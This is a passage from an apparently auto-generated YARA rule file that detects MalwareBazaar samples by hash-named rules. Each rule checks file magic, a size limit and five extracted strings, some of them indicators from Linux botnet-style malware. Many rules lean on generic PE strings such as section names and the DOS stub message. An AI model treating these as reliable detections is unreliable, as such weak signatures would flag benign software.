        $s4 = "t@;D$xu"
        $s5 = "D$7hHu"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 67KB
        and all of them
}

rule Windows_f0dee3431ba080ec1fd1975882ae347be81cbb21a81e64ffdf6cc41e14b42fa6
{
    meta:
        description = "Auto ML: f0dee3431ba080ec1fd1975882ae347be81cbb21a81e64ffdf6cc41e14b42fa6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "QaFf B"
        $s5 = "a )UL\"a}"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2017KB
        and all of them
}

rule Windows_f12734aeb802ff0928b8ea0297d79d69eb30e93855612d63ca174986384b7311
{
    meta:
        description = "Auto ML: f12734aeb802ff0928b8ea0297d79d69eb30e93855612d63ca174986384b7311"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2993KB
        and all of them
}

rule Windows_f146915a0298daff26ffe85a42b9a9ef68e7a148e3dbe3bc43abb283d96facbd
{
    meta:
        description = "Auto ML: f146915a0298daff26ffe85a42b9a9ef68e7a148e3dbe3bc43abb283d96facbd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "A1GIA+"
        $s3 = "A1GyA8"
        $s4 = "A1GJA+"
        $s5 = "ARich*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 56KB
        and all of them
}

rule Windows_f150f98d8db9547e50591b84478d2c815b43515f160dbc2f55332c27a2474e70
{
    meta:
        description = "Auto ML: f150f98d8db9547e50591b84478d2c815b43515f160dbc2f55332c27a2474e70"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "AM )UU"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1296KB
        and all of them
}

rule Windows_f17f41323edce0c031d30cb3806fff82a7adb07cbd653e93316eab84b05fcb7f
{
    meta:
        description = "Auto ML: f17f41323edce0c031d30cb3806fff82a7adb07cbd653e93316eab84b05fcb7f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3193KB
        and all of them
}

rule Windows_f1ba0000ca5e3000165e46e43d0b254f6935bd93feb32be64fa57f05732c5548
{
    meta:
        description = "Auto ML: f1ba0000ca5e3000165e46e43d0b254f6935bd93feb32be64fa57f05732c5548"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "+0qHXKlHg"
        $s5 = "abvroJp"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1306KB
        and all of them
}

rule Windows_01e57bfd68aaf8de3af7e865c815a2e88b01174a7ae2856928ff1e10391bed9a
{
    meta:
        description = "Auto ML: 01e57bfd68aaf8de3af7e865c815a2e88b01174a7ae2856928ff1e10391bed9a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2395KB
        and all of them
}

rule Windows_1730345fea7a9812b05c73cc2fe4791597f87d7ed40018c127c94f7066173353
{
    meta:
        description = "Auto ML: 1730345fea7a9812b05c73cc2fe4791597f87d7ed40018c127c94f7066173353"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1162KB
        and all of them
}

rule Windows_f22e8c6027000f421c70d5733ff537d1e2e49deb5cc1d6ad3287175dffc2668e
{
    meta:
        description = "Auto ML: f22e8c6027000f421c70d5733ff537d1e2e49deb5cc1d6ad3287175dffc2668e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB
        and all of them
}

rule Windows_f28ca289207dfe7c79f3eca130f2a340bbc260c9818b5f5d7b94a3304a9fd4b1
{
    meta:
        description = "Auto ML: f28ca289207dfe7c79f3eca130f2a340bbc260c9818b5f5d7b94a3304a9fd4b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Ns1hRs"
        $s5 = "-OsbrRs"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 100KB
        and all of them
}

rule Windows_f2965385482045f065caf8a7b212880266f6bd6b360c8248559eb3a12217e27d
{
    meta:
        description = "Auto ML: f2965385482045f065caf8a7b212880266f6bd6b360c8248559eb3a12217e27d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3098KB
        and all of them
}

rule Windows_f2ac390b52f206b054befdf6b04f717b98df64eeb74c83629a75a93f09b1a6c7
{
    meta:
        description = "Auto ML: f2ac390b52f206b054befdf6b04f717b98df64eeb74c83629a75a93f09b1a6c7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "\"ffffff."
        $s5 = "ffffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 573KB
        and all of them
}

rule Windows_f2b63f92ce68836d5f33b8136c8dae7344944a099884e2aad0726e5abdd3f881
{
    meta:
        description = "Auto ML: f2b63f92ce68836d5f33b8136c8dae7344944a099884e2aad0726e5abdd3f881"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Action`10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 48KB
        and all of them
}

rule Linux_f2ccf0f52d1d66e1674f8096c1816968b7f3d7711af4735ab2311d7edccecb4f
{
    meta:
        description = "Auto ML: f2ccf0f52d1d66e1674f8096c1816968b7f3d7711af4735ab2311d7edccecb4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "APe|l3j"
        $s3 = "AmH|g;\"'"
        $s4 = "AmH|g;\"("
        $s5 = "/Ln\"Oh"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 51KB
        and all of them
}

rule Linux_f2d7e8e62d588aca7b1bf07510ccfa21ed6b19cb043107316e9735888b167739
{
    meta:
        description = "Auto ML: f2d7e8e62d588aca7b1bf07510ccfa21ed6b19cb043107316e9735888b167739"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 194KB
        and all of them
}

rule Windows_f2f4a080f5b2c9d0ab62fe32580a31eba7941e17185223bf28ad18840a8ae5a2
{
    meta:
        description = "Auto ML: f2f4a080f5b2c9d0ab62fe32580a31eba7941e17185223bf28ad18840a8ae5a2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "\"jRichJ"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "VVVVVVVVh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1299KB
        and all of them
}

rule Linux_f350d6c434afc2acfae38863a5581d94fd45620a045e8a9dca056545977d3925
{
    meta:
        description = "Auto ML: f350d6c434afc2acfae38863a5581d94fd45620a045e8a9dca056545977d3925"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "T$d9T$p"
        $s2 = "@tHPPj"
        $s3 = ";|$(t:WWj"
        $s4 = "D$(RRj"
        $s5 = "T$(PPj"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 103KB
        and all of them
}

rule Windows_f38327b8c73b8f9b205f8ac447f83c7a6b425908283bb68bf742827248dd4f32
{
    meta:
        description = "Auto ML: f38327b8c73b8f9b205f8ac447f83c7a6b425908283bb68bf742827248dd4f32"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Go3[Go3[Go3[S"
        $s3 = "7ZLo3[S"
        $s4 = "0ZBo3[S"
        $s5 = "0ZNo3[S"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5389KB
        and all of them
}

rule Windows_1742b48fad9814441ee7726009a0e375757134dcc872f88ed584b6a2099c7473
{
    meta:
        description = "Auto ML: 1742b48fad9814441ee7726009a0e375757134dcc872f88ed584b6a2099c7473"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Action`10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 63KB
        and all of them
}

rule Windows_f3bf0bc6ae0dc1d8bd4c24f0d2b581145d9d5395d173dbccc724eb5d0d1de956
{
    meta:
        description = "Auto ML: f3bf0bc6ae0dc1d8bd4c24f0d2b581145d9d5395d173dbccc724eb5d0d1de956"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "&rAo:|A"
        $s3 = "&sAT$rAo./A"
        $s4 = "xA=&rA"
        $s5 = "yA|&rA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 14636KB
        and all of them
}

rule Linux_f4044964a9c0bf74603e94f09230a9643a785fc623c60b823197f6878bcc99e7
{
    meta:
        description = "Auto ML: f4044964a9c0bf74603e94f09230a9643a785fc623c60b823197f6878bcc99e7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 147KB
        and all of them
}

rule Linux_f40d25d149bb970c7cff3fec7dfde5f2d5a0dce52cd2fb339de144160e68e705
{
    meta:
        description = "Auto ML: f40d25d149bb970c7cff3fec7dfde5f2d5a0dce52cd2fb339de144160e68e705"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "6C/NmA"
        $s2 = "hT5&UqHKe"
        $s3 = "'C#CdH"
        $s4 = "Ec|);-FDR"
        $s5 = "iNTvtwe"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 53KB
        and all of them
}

rule Windows_f4273f9df8bca6ecf2fad75248105d1ac87cf4bb01dd69c50511b62199f71988
{
    meta:
        description = "Auto ML: f4273f9df8bca6ecf2fad75248105d1ac87cf4bb01dd69c50511b62199f71988"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2440KB
        and all of them
}

rule Windows_f47ae4e664869d909874896cdc389a1a808054a9cd8bd495fe77d608bd01065a
{
    meta:
        description = "Auto ML: f47ae4e664869d909874896cdc389a1a808054a9cd8bd495fe77d608bd01065a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4603KB
        and all of them
}

rule Windows_f47c028b576f0510c5a5ecee522789eccef66ac59d3d60e7b4c91ef0841e9730
{
    meta:
        description = "Auto ML: f47c028b576f0510c5a5ecee522789eccef66ac59d3d60e7b4c91ef0841e9730"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1152KB
        and all of them
}

rule Windows_f49a368529fcc6e6e9f1bc66b6254bda180d5d80189859d10116c9e5719eba1c
{
    meta:
        description = "Auto ML: f49a368529fcc6e6e9f1bc66b6254bda180d5d80189859d10116c9e5719eba1c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "JXe B_"
        $s4 = "Y E%pMa}"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2788KB
        and all of them
}

rule Windows_f49df8365499aecefe4017e54f3c706cc2da4e0e90e59431c3d531253cf479c6
{
    meta:
        description = "Auto ML: f49df8365499aecefe4017e54f3c706cc2da4e0e90e59431c3d531253cf479c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 273KB
        and all of them
}

rule Windows_f4c455771c51a4cc207b7d4712e405a0d6474029541d2dbab07dc11f2bb39921
{
    meta:
        description = "Auto ML: f4c455771c51a4cc207b7d4712e405a0d6474029541d2dbab07dc11f2bb39921"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4764KB
        and all of them
}

rule Windows_f4c51f676fbf02b54592aeffda6f0b342db00d7170f479a7cf0ba40420153322
{
    meta:
        description = "Auto ML: f4c51f676fbf02b54592aeffda6f0b342db00d7170f479a7cf0ba40420153322"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 301KB
        and all of them
}

rule Windows_1749c2de6125b6a38e42dd557b64b2d07abec025eb50f23743394136f655cf35
{
    meta:
        description = "Auto ML: 1749c2de6125b6a38e42dd557b64b2d07abec025eb50f23743394136f655cf35"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".gezec"
        $s5 = ".nosehetA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB
        and all of them
}

rule Windows_f4c981438a224d6e37c984b07556a444c6f8677d76e566a1b54db33847f559c9
{
    meta:
        description = "Auto ML: f4c981438a224d6e37c984b07556a444c6f8677d76e566a1b54db33847f559c9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = ".jVS5c"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17040KB
        and all of them
}

rule Windows_f4ce9768f48453eafcacc6856ab813d9693760e91da762e4597922a836ffce78
{
    meta:
        description = "Auto ML: f4ce9768f48453eafcacc6856ab813d9693760e91da762e4597922a836ffce78"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2544KB
        and all of them
}

rule Windows_f520eb5804ae1b26974fabee5403470f1aa97b837fdd9856b3a5f252199a07f4
{
    meta:
        description = "Auto ML: f520eb5804ae1b26974fabee5403470f1aa97b837fdd9856b3a5f252199a07f4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = ".pdata"
        $s4 = "@.rsrc"
        $s5 = "5$[7_bhd.i+4_!^2r![qr_4an)^().,_"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 30728KB
        and all of them
}

rule Windows_f554eee597d0262cd192e15ecfb61c71746ca2c0bc9948dc7703440e797f802e
{
    meta:
        description = "Auto ML: f554eee597d0262cd192e15ecfb61c71746ca2c0bc9948dc7703440e797f802e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "pb_Click10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 686KB
        and all of them
}

rule Linux_f5560f06287915911aced83dada5851fd48752b3ecb4cd9e1331970a09b45bf8
{
    meta:
        description = "Auto ML: f5560f06287915911aced83dada5851fd48752b3ecb4cd9e1331970a09b45bf8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4Jfg"
        $s2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678"
        $s3 = "<!: acam"
        $s4 = "t#5't<1&1t8;8T"
        $s5 = "nt5$$81 t:; t2;!:0T"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 75KB
        and all of them
}

rule Windows_f5583f23e429e7587b8ea4a367564b50be79e598c46c0545fe5a5b32dc58d6d0
{
    meta:
        description = "Auto ML: f5583f23e429e7587b8ea4a367564b50be79e598c46c0545fe5a5b32dc58d6d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "+C&KX3SH"
        $s3 = "AC5lB|"
        $s4 = "n\"oX:i"
        $s5 = "Q_.a?kl4"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5830KB
        and all of them
}

rule Windows_f58e57d1015834305e61c7f021794c682ee9174bb3ad6eb189620811fea975a8
{
    meta:
        description = "Auto ML: f58e57d1015834305e61c7f021794c682ee9174bb3ad6eb189620811fea975a8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "leVzE_"
        $s3 = "dqGjvY"
        $s4 = "X!usd,"
        $s5 = "@(wTdP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 33KB
        and all of them
}

rule Linux_f5caeea5742112353d290b4bc5c2b8041f52f9d37bbfc45e03fa9373e6595350
{
    meta:
        description = "Auto ML: f5caeea5742112353d290b4bc5c2b8041f52f9d37bbfc45e03fa9373e6595350"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "HEAD /"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 165KB
        and all of them
}

rule Windows_f5e6a0b0c3587f36c025c2bb94929f8b7273f25c5ebdc6755f6a582b01cb8caa
{
    meta:
        description = "Auto ML: f5e6a0b0c3587f36c025c2bb94929f8b7273f25c5ebdc6755f6a582b01cb8caa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Action`10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 48KB
        and all of them
}

rule Windows_f5ef6f1272125d6166ac834f0dc7d9b3a180376842d2f77364b8f9d148161fa2
{
    meta:
        description = "Auto ML: f5ef6f1272125d6166ac834f0dc7d9b3a180376842d2f77364b8f9d148161fa2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADPtHc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7176KB
        and all of them
}

rule Windows_174db77d4852579384371ddd568133a048de23035171765387ee7428cc93bc22
{
    meta:
        description = "Auto ML: 174db77d4852579384371ddd568133a048de23035171765387ee7428cc93bc22"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 409KB
        and all of them
}

rule Linux_f5fe110ad4b3c935e9b025c0597d379595413038f4a145e106f3e879ba002cca
{
    meta:
        description = "Auto ML: f5fe110ad4b3c935e9b025c0597d379595413038f4a145e106f3e879ba002cca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678"
        $s2 = "<!: acam"
        $s3 = "t#5't<1&1t8;8T"
        $s4 = "nt5$$81 t:; t2;!:0T"
        $s5 = "{6=:{6!'-6;,t?=88tymtT"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB
        and all of them
}

rule Windows_f621004ddaf082516c2e86ae9b0247c50309e16b09393694ebd3601a2f4d6659
{
    meta:
        description = "Auto ML: f621004ddaf082516c2e86ae9b0247c50309e16b09393694ebd3601a2f4d6659"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 636KB
        and all of them
}

rule Windows_f6503af4165e558f39c767f7df0c1b28adcd8149d64b5ac810687e1ba53daffb
{
    meta:
        description = "Auto ML: f6503af4165e558f39c767f7df0c1b28adcd8149d64b5ac810687e1ba53daffb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1608KB
        and all of them
}

rule Windows_f6957a035715b303925a5215f2f5b56933aaf0cb3307d3bf8826f2d35515c73f
{
    meta:
        description = "Auto ML: f6957a035715b303925a5215f2f5b56933aaf0cb3307d3bf8826f2d35515c73f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".dujayu"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB
        and all of them
}

rule Windows_f6b10c59c9ce33c5c8f6b02c3293fe5d479e59542698c91b15af74bcce50ab8f
{
    meta:
        description = "Auto ML: f6b10c59c9ce33c5c8f6b02c3293fe5d479e59542698c91b15af74bcce50ab8f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "8r,q,>ak$1m5y=n0eh,+=]1.yu+$:96y"
        $s4 = "q/>ak 1m5"
        $s5 = "h,+=]1.9u+$:96y8r,q,>ak$1m5y=n0eh,+=]1.yu+$"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1663KB
        and all of them
}

rule Windows_f6c152fef8121d507180919cd15337960e5b5c15c0e6ef751475558da764cb67
{
    meta:
        description = "Auto ML: f6c152fef8121d507180919cd15337960e5b5c15c0e6ef751475558da764cb67"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Linux_f6f3aac7af40458bafc2936cf126642e30c71ca9997696d817cc436642c461a2
{
    meta:
        description = "Auto ML: f6f3aac7af40458bafc2936cf126642e30c71ca9997696d817cc436642c461a2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 146KB
        and all of them
}

rule Windows_f7023ac898d727474c62ce2496df6131d349bb957bfc5f88d1dbd1886defafd2
{
    meta:
